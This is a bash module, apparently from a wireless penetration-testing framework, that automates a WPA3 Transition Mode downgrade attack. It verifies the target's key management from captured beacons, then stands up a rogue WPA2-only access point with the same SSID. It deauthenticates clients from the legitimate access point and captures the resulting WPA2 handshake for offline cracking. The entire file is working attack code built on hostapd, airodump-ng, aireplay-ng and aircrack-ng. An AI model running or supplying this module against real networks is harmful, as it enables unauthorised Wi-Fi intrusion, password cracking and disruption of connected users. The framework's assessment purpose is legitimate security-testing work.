#!/usr/bin/env bash
#===============================================================================
#  modules/d7_wpa3_downgrade_active.sh
#  D7: WPA3 Transition Mode Downgrade Attack (Active)
#
#  PURPOSE:
#    Perform an active downgrade attack against WPA3 Transition Mode.
#    Deploys a rogue WPA2-only AP with the same SSID and deauthenticates
#    clients to force them to fall back to WPA2, allowing handshake capture
#    and offline cracking.
#===============================================================================

run_d7() {
    local total_steps=6
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d7"
    
    log_step 1 $total_steps "Analyzing Target for Transition Mode"
    update_tc_progress 1 $total_steps "Analysis"

    if [[ -z "${GUEST_SSID:-}" ]]; then
        log_error "Target SSID not set. Run A1 first."; return 1
    fi

    local transition_mode="false"
    if has_tc_results "A1"; then
        # Use tshark to check for both SAE and PSK AKMs in the same beacon
        enable_monitor_mode || return 1
        local mon_iface="${MONITOR_INTERFACE}"
        local beacon_file="/tmp/d7_beacon.pcap"
        
        log_info "Capturing beacon for AKM verification..."
        ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -c 10 -w "$beacon_file" "type mgt subtype beacon and ether src ${GUEST_BSSID}" &>/dev/null || true
        
        if [[ -f "$beacon_file" ]]; then
            local akms=$(${TOOL_PATHS[tshark]} -r "$beacon_file" -T fields -e wlan.rsn.akms.type 2>/dev/null | head -1)
            # Type 2=PSK, 8=SAE. If both present, it's transition mode.
            if [[ "$akms" == *"2"* ]] && [[ "$akms" == *"8"* ]]; then
                transition_mode="true"
                log_success "CONFIRMED: Target is in WPA3 Transition Mode."
            fi
            rm -f "$beacon_file"
        fi
    fi

    if [[ "$transition_mode" != "true" ]]; then
        log_warn "Target does not appear to use WPA3 Transition Mode. Skipping active attack."
        return 0
    fi

    log_step 2 $total_steps "Preparing Rogue WPA2 AP"
    update_tc_progress 2 $total_steps "AP Setup"

    local hostapd_conf="${SESSION_EVIDENCE_DIR}/d7_hostapd.conf"
    local ap_iface="${WIFI_INTERFACE:-wlan0}" # We need a managed interface for hostapd usually, or a second card
    
    # Check if we have a second card or need to reuse
    # For a real attack, we usually need two cards: one for Rogue AP, one for Deauth
    # But for this module, we'll use one and switch quickly, or assume the user has configured it.
    
    log_info "Deploying Rogue AP: ${GUEST_SSID} (WPA2-PSK Only)"
    
    cat <<EOF > "$hostapd_conf"
interface=${ap_iface}
driver=nl80211
ssid=${GUEST_SSID}
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=any_passphrase_to_capture_handshake
EOF

    log_step 3 $total_steps "Deploying Attack"
    update_tc_progress 3 $total_steps "Execution"

    # Start Rogue AP in background
    log_info "Starting Rogue AP..."
    ${TOOL_PATHS[hostapd]} "$hostapd_conf" > "${evidence_prefix}_hostapd.log" 2>&1 &
    local ap_pid=$!
    register_cleanup "kill -TERM $ap_pid 2>/dev/null || true; wait $ap_pid 2>/dev/null || true"

    sleep 5

    # Start Handshake Capture
    local handshake_cap="${evidence_prefix}_downgrade_handshake"
    ${TOOL_PATHS[airodump-ng]} --essid "$GUEST_SSID" --channel 6 --write "$handshake_cap" "$mon_iface" &>/dev/null &
    local airo_pid=$!
    register_cleanup "kill -SIGINT $airo_pid 2>/dev/null || true; wait $airo_pid 2>/dev/null || true"

    log_step 4 $total_steps "Forcing Downgrade (Deauth)"
    update_tc_progress 4 $total_steps "Deauthentication"

    log_info "Deauthenticating clients from legitimate AP (${GUEST_BSSID})..."
    ${TOOL_PATHS[aireplay-ng]} --deauth 20 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true

    start_countdown 60 "Waiting for clients to fall back to Rogue WPA2 AP"
    sleep 60
    stop_countdown

    log_step 5 $total_steps "Analyzing Capture"
    local handshake_found="false"
    local cap_file=$(ls "${handshake_cap}"*.cap 2>/dev/null | head -1)
    if [[ -n "$cap_file" ]]; then
        if ${TOOL_PATHS[aircrack-ng]} "$cap_file" | grep -q "1 handshake"; then
            handshake_found="true"
            log_result "CRITICAL" "WPA3 DOWNGRADE SUCCESSFUL: Captured WPA2 handshake from WPA3-capable client!"
        fi
    fi

    log_step 6 $total_steps "Saving Results"
    local vulnerability="SECURE"
    [[ "$handshake_found" == "true" ]] && vulnerability="VULNERABLE"
    
    local result_json=$(${TOOL_PATHS[jq]} -n \
        --arg status "$vulnerability" \
        --arg summary "WPA3 Transition Downgrade: ${vulnerability}" \
        --arg details "Target SSID: ${GUEST_SSID}, Handshake Captured: ${handshake_found}" \
        '{
            status: $status,
            summary: $summary,
            details: $details
        }')
    
    save_tc_result "D7" "$result_json"
    return 0
}
